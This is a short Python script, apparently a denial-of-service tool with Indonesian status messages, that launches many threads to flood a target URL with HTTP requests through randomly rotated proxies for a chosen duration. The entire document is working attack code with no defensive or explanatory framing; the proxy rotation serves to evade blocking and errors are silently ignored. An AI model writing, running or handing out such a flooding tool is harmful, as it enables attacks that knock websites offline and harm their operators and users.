import threading, requests, time, random from proxy import load_proxies

def attack(target, proxy): try: proxies = { 'http': f'http://{proxy}', 'https': f'http://{proxy}', } requests.get(target, proxies=proxies, timeout=5) except: pass

def start_attack(target, num_threads, duration): proxies = load_proxies() stop_time = time.time() + duration print(f"Menyerang {target} selama {duration} detik...\n")

def worker():
    while time.time() < stop_time:
        proxy = random.choice(proxies)
        attack(target, proxy)

threads = [threading.Thread(target=worker) for _ in range(num_threads)]
for t in threads:
    t.start()
for t in threads:
    t.join()

print("\nSelesai mengirim serangan.")